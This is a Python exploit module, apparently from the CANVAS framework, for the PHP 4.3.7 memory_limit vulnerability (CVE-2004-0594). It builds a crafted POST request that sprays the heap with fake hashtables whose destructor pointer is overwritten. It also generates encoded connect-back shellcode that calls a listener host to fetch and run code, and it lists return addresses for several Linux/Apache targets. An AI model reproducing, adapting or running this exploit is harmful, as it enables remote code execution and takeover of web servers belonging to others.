#! /usr/bin/env python

# this is a preliminary research-release
#
# TODO:
#
# - add targets
# - find better memleak
# - bruteforce mode
# - use list.append instead of +=
# - track down encoding problem (sometimes we have bad encoding on payload)

import sys
sys.path.append(".")
sys.path.append("../../")

import os
import getopt
import socket
import struct
import time
import select

from exploitutils import *
from tcpexploit import *
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
from encoder import addencoder
from shellcode import shellcodeGenerator

from shellcode import linuxshell
from libs.ctelnetlib import Telnet

# GUI info
NAME="php_limit"
DESCRIPTION="PHP <= 4.3.7 memory_limit exploit"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="PHP"
DOCUMENTATION["Date public"] = "2004/07/14"
DOCUMENTATION["OSVDB"] = ""
DOCUMENTATION["References"] = "http://security.e-matters.de/advisories/112004.html"
DOCUMENTATION["Repeatability"] = "Multiple tries"
DOCUMENTATION["CVE Name"] = "CVE-2004-0594"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0594"
DOCUMENTATION['CVSS'] = 5.1

VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "i386"] ]
PROPERTY['ENDIAN'] = "Little"

NOTES="""

There is a full Immunity research paper available on request.

To debug on the slackware vm use the '/www/bin/apachectl start' httpd.
Remember to ifconfig the eth0 on the slackware vm first.

NOTE: this is not a very reliable attack especially in it's current form

Example:

./exploits/php_limit/php_limit.py -t SLACKWAREVM -v 1 -l LISTENHOST -d 8080 -O phpfile:info.php

"""

##################### TARGETS #########################

LINUX=0
BSD=1
SOLARIS=2

targets = {
    # name, type, retadd
    0 : ["Autoversioning N/A", 0, 0],

    # source compile, no E variables
    1 : ["Linux IA32 : slackware 9 / Apache 1.3.31 / PHP 4.3.7 (no E)", LINUX, 0x40365954],
    # source compile, no E variables
    2 : ["Linux IA32 : debian 3.1 (sarge) / Apache 1.3.31 / PHP 4.3.7 (no E)", LINUX, 0x40373034],
    # package install, no E variables
    3 : ["Linux IA32 : debian 3.1 (sarge) / Apache 1.3.31 / PHP 4.3.4 (no E)", LINUX, 0x48af2a18],
    # package install, with E array
    4 : ["Linux IA32 : debian 3.1 (sarge) / Apache 1.3.31 / PHP 4.3.4 (E)", LINUX, 0x48af2a18],

    5 : ["Linux IA32 : debug", LINUX, 0x41424344]
          }

###################### TARGETS ########################


class linuxIA32(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        return

    def createShellcode_lnx86(self, localhost, localport):
        myshellcode=shellcodeGenerator.linux_X86()
        myshellcode.addAttr("connect",{"ipaddress":localhost,"port":localport})
        myshellcode.addAttr("read_and_exec",{"fdreg": "esi"})
        shellcode=myshellcode.get()
        badstring = "\x00\\/.:?\r\n%?\" []&\t=;+-'"
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(badstring)
        self.log("Encoding shellcode")
        shellcode = encoder.encode(shellcode)
        if shellcode == "":
            self.log("Problem encoding shellcode")
            raise Exception, "error encoding shellcode"
        self.log("Shellcode length: %d"%len(shellcode))
        return shellcode

    def getHeader(self, filename, length):
        print "%dM (%d)"%(length/(1024*1024), length)
        request = "POST "+filename+" HTTP/1.0\r\n"
        request += "Host: 127.0.0.1\r\n"
        request += "User-Agent: Mozilla\r\n"
        request += "Accept: text/html\r\n"
        request += "Connection: Keep-Alive\r\n"
        request += "Pragma: no-cache\r\n"
        request += "Cache-Control: no-cache\r\n"
        # > 40 to prevent cachehit on this for hashtable
        request += "Content-Type: application/x-www-form-urlencoded;"+"A"*32+"\r\n"
        request += "Content-Length: %d\r\n"%(length)
        # just for me
        request += "X-PAD: "+"A"*36+"\r\n"
        request += "\r\n"
        return request

class theexploit(linuxIA32):
    def __init__(self):
        linuxIA32.__init__(self)
        self.host = None
        self.port = 80
        self.localhost = None
        self.localport = None
        self.phpfile = "index.php"
        self.cmdline = 0
        self.helperhost = ""
        self.name=NAME
        self.ssl=0
        self.username=0
        self.password=0
        return

    def connectTo(self, t_host, t_port):
        s=self.gettcpsock()
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((t_host, t_port))
        except:
            raise Exception, "Failed to connect"

        if self.ssl:
            #timeoutsocket mod here...
            s=socket.ssl(s._sock)
        return s

    def createShellcode(self):

        if self.callback:
            host=self.callback.ip
            port=self.callback.port
        else:
            self.log("No callback listener?")
            return ""

        self.localhost = host
        self.localport = port
        try:
            name,type,retadd=targets[self.version]
        except KeyError:
            self.log("Version %d not known"%self.version)
            raise Exception, "Unknown version"
        print "Using payload for type: %s"%name
        if type==LINUX:
            self.shellcode = self.createShellcode_lnx86(host, port)
        else:
            raise Exception, "No payload for type: %s"%name
        return self.shellcode

    def neededListenerTypes(self):
        if self.version == 0:
            self.test()
            return []
        if targets[self.version][0].count("Linux"):
            from canvasengine import LINUXMOSDEF
            return [LINUXMOSDEF]
        else:
            self.log("Do not understand version %d"%self.version)
            return []

    def test(self):
        self.log("No testing yet!")
        return 0

    def getOut(self, s):
        if self.socknode.nodetype in ["LocalNode"]:
            if self.ssl:
                reply=s.read(0x2000)
                print reply
                return
            if select.select([s],[],[],2) != ([],[],[]):
                reply = s.recv(0x2000)
                print reply
        elif self.socknode.nodetype in ["linuxNode"]:
            s.set_timeout(2000) #2 seconds
            reply=s.recv_lazy()
            print reply

    # slap in payload here
    # need to optimise this routine to not suck resources
    def writeStringVar(self, s, size, bodysize, num):
        cache = ""
        # varname len direct e-malloc influence
        for i in range(0, num):
            id = "%X"%i
            noppad = 1024
            if size-len(id) >= (len(self.shellcode)+noppad):
                i = 0
                body = ""
                while (i < (size-(len(id)+len(self.shellcode)+noppad))):
                    body += "A"*noppad
                    body += self.shellcode
                    i = len(body)
                if i < (size-len(id)):
                    body += "A"*((size-len(id))-i)
                body += id+"="+"A"*bodysize+"&"
            else:
                body = "A"*(size-len(id))+id+"="+"A"*bodysize+"&"
            cache += body
            if len(cache) >= 0x1000:
                sys.stderr.write("#")
                if self.ssl:
                    s.write(cache)
                else:
                    s.send(cache)
                cache = ""
        if cache != "":
            sys.stderr.write("#")
            if self.ssl:
                s.write(cache)
            else:
                s.send(cache)

        sys.stderr.write("\n")

    def writeHashAndPadVar(self, s, size, num, retadd):
        cache = ""
        # varname len direct e-malloc influence
        junkptr = retadd-0xFF
        self.log("setting: %X as junk ptr"%junkptr)
        self.log("setting: %X as pDestructor"%retadd)
        for i in range(0, num):
            id = "%X"%i
            if i < 0xA0:
                # inject hastables here
                # these are released into cache
                body = "A"*(size-len(id))+id+"="
                table = ""
                # pre-pad is inited by php
                table += "A"*8
                # hastable
                # nNumOfElements
                table += "AAAA"
                # nNextFreeElement
                table += "BBBB"
                # pInternalPointer
                table += "CCCC"
                # pListHead (needs to be a valid ptr)
                table += struct.pack("<L",junkptr)
                # pListTail
                table += "EEEE"
                # arBuckets (doesn't necesarily need to be a valid ptr)
                table += struct.pack("<L",junkptr)
                # pDestructor !!!
                table += struct.pack("<L",retadd)
                # persistent
                table += "A"
                # nApplyCount
                table += "A"
                # bApplyProtection
                table += "A"
                body += table + "&"
            else:
                body = "A"*(size-len(id))+id+"="+"1234&"
            cache += body
            if len(cache) >= 0x1000:
                sys.stderr.write("#")
                if self.ssl:
                    s.write(cache)
                else:
                    s.send(cache)
                cache = ""
        if cache != "":
            sys.stderr.write("#")
            if self.ssl:
                s.write(cache)
            else:
                s.send(cache)
        sys.stderr.write("\n")

    def calcTotal(self, pad1, pad2, pad3, finalvar):
        # base alloc for payload and major space eating
        pad1num = pad1[0]
        pad1size = pad1[1]
        pad1bsize = pad1[2]
        # precision pad in here
        pad2num = pad2[0]
        pad2size = pad2[1]
        # !!! do your precision padding here (n == roughly malloc(n*2)
        pad2bsize = pad2[2]

        # needs to be > 0xa0 atleast
        # see notes on why we use this to get us in the ballpark
        pad3num = pad3[0]
        pad3size = pad3[1]

        # make sure the overheads are right !
        total  = pad1num * ((pad1size)+pad1bsize+2)
        total += 1 * ((pad2size)+pad2bsize+2)
        total += 0xa0 * (pad3size+39+2)
        total += (pad3num-0xa0) * (pad3size+4+2)
        # final array trigger
        total += len(finalvar)
        return total

    def targetAllocs(self, version, name):

        # here we set the alloc patterns for the targets

        if version == 1:
            self.log("Setting alloc pattern: %s"%name)
            # slackware 9, apache 1.3.31, php 4.3.7
            # base alloc for payload and major space eating
            pad1num = 2
            pad1size = 1024*1024
            pad1bsize = 4
            pad1 = [pad1num, pad1size, pad1bsize]

            # precision pad in here
            pad2num = 1
            pad2size = 1024*24
            # !!! do your precision padding here (n == roughly malloc(n*2)
            pad2bsize = 2520
            pad2 = [pad2num, pad2size, pad2bsize]

            # needs to be > 0xa0 atleast for our 40 byte block caching
            # see notes on why we use this to get us in the ballpark
            pad3num = 14151
            pad3size = 8
            pad3 = [pad3num, pad3size]

        elif version == 2:
            self.log("Setting alloc pattern: %s"%name)
            # debian 3.1 (sarge), apache 1.3.31, php 4.3.7
            # base alloc for payload and major space eating
            pad1num = 2
            pad1size = 1024*1024
            pad1bsize = 4
            pad1 = [pad1num, pad1size, pad1bsize]

            # precision pad in here
            pad2num = 1
            pad2size = 1024*24
            # !!! do your precision padding here (n == roughly malloc(n*2)
            pad2bsize = 2520
            pad2 = [pad2num, pad2size, pad2bsize]

            # needs to be > 0xa0 atleast for our 40 byte block caching
            # see notes on why we use this to get us in the ballpark
            pad3num = 14151
            pad3size = 8
            pad3 = [pad3num, pad3size]

        elif version == 3:
            # debian 3.1 (sarge) Apache 1.3.31 and php 4.3.4 from package
            # no E variables in php.ini
            self.log("Setting alloc pattern: %s"%name)
            pad1num = 2
            pad1size = 1024*1024
            pad1bsize = 4
            pad1 = [pad1num, pad1size, pad1bsize]

            # precision pad in here
            pad2num = 1
            pad2size = 1024*25
            # !!! do your precision padding here (n == roughly malloc(n*2)
            pad2bsize = 3680
            pad2 = [pad2num, pad2size, pad2bsize]

            # needs to be > 0xa0 atleast for our 40 byte block caching
            # see notes on why we use this to get us in the ballpark
            pad3num = 14151
            pad3size = 8
            pad3 = [pad3num, pad3size]

        elif version == 4:
            # debian 3.1 (sarge) Apache 1.3.31 and php 4.3.4 from package
            # E variables in php.ini
            self.log("Setting alloc pattern: %s"%name)
            pad1num = 2
            pad1size = 1024*1024
            pad1bsize = 4
            pad1 = [pad1num, pad1size, pad1bsize]

            # precision pad in here
            pad2num = 1
            pad2size = 1024*24
            # !!! do your precision padding here (n == roughly malloc(n*2)
            pad2bsize = 4390
            pad2 = [pad2num, pad2size, pad2bsize]

            # needs to be > 0xa0 atleast for our 40 byte block caching
            # see notes on why we use this to get us in the ballpark
            pad3num = 14151
            pad3size = 8
            pad3 = [pad3num, pad3size]

        # debug target
        elif version == 5:
            self.log("Setting alloc pattern: %s"%name)
            pad1num = 2
            pad1size = 1024*1024
            pad1bsize = 4
            pad1 = [pad1num, pad1size, pad1bsize]

            # precision pad in here
            pad2num = 1
            pad2size = 1024*24
            # !!! do your precision padding here (n == roughly malloc(n*2)
            pad2bsize = 4270
            pad2 = [pad2num, pad2size, pad2bsize]

            # needs to be > 0xa0 atleast for our 40 byte block caching
            # see notes on why we use this to get us in the ballpark
            pad3num = 14151
            pad3size = 8
            pad3 = [pad3num, pad3size]

        else:
            raise Exception, "unknown version"
        return [pad1, pad2, pad3]

    def run(self):
        self.host = self.target.interface
        self.port = int(self.argsDict["port"])
        self.socknode = self.argsDict["passednodes"][0]
        try:
            self.ssl=self.argsDict["ssl"]
            self.username=self.argsDict["user"]
            self.password=self.argsDict["password"]
        except:
            pass

        s = self.connectTo(self.host, self.port)
        self.setInfo("%s running"%self.name)
        #print "ATTACH"
        #sys.stdin.read(1)

        name,type,retadd=targets[self.version]

        self.phpfile = self.argsDict.get("phpfile",self.phpfile)

        finalvar = "a[]=TRIGGER"

        allocpattern = self.targetAllocs(self.version,name)

        pad1 = allocpattern[0]
        pad2 = allocpattern[1]
        pad3 = allocpattern[2]

        # base alloc for payload and major space eating
        pad1num = pad1[0]
        pad1size = pad1[1]
        pad1bsize = pad1[2]
        # precision pad is in here
        pad2num = pad2[0]
        pad2size = pad2[1]
        pad2bsize = pad2[2]
        # ballpark allocs + hashtable caches here
        pad3num = pad3[0]
        pad3size = pad3[1]

        total = self.calcTotal(pad1, pad2, pad3, finalvar)

        request = self.getHeader("/"+self.phpfile+"?a[]="+"A"*4, total)
        if self.ssl:
            s.write(request)
        else:
            s.send(request)

        self.writeStringVar(s, pad1size, pad1bsize, pad1num)
        self.setProgress(33)
        self.writeStringVar(s, pad2size, pad2bsize, pad2num)
        self.setProgress(66)

        # our hashtables are injected here
        # pseudo-global pad to get us in the ballpark
        # see above for precision pad, we have this
        # construction because if we do a straight
        # alloc, SAPI.c will free() a good chunk of
        # our POST data, falling back, thus peaking
        # before being able to trigger in the P merge
        # zend_hash_init on the array hashtable

        self.log("Targeting: %s @ %s:%d"%(name,self.host,self.port))
        self.log("Connectback values: %s:%d"%(self.localhost,self.localport))

        self.writeHashAndPadVar(s, pad3size, pad3num, retadd)
        self.setProgress(99)

        # repeat array var
        if self.ssl:
            s.write(finalvar)
        else:
            s.send(finalvar)
        self.setProgress(100)

        self.getOut(s)
        if not self.ssl:
            s.close()
        self.log("Completed run -- connectback may take a while (remember to exit the owned process when you're done)")
        self.log("Sleeping 10 seconds for connectback")
        time.sleep(10)
        #this will check the connecback if we are remoted.
        self.setInfo("%s done"%self.name)
        if self.ISucceeded():
            return 1
        return 0

    def displayVersions(self):
        i = 0
        print "="*40
        print "Available versions:"
        print "="*40
        for listline in targets.values():
            print "Version: %d Type: %s"% (i, listline[0])
            i+=1
        print "="*40

    def usage(self):
        print "Options: -v version -t host -O phpfile:file.php -l callbackhost -d callbackport [ -p <port> ] [ -T ] [ -O ssl:1 ]"
        self.displayVersions()

if __name__== '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)






















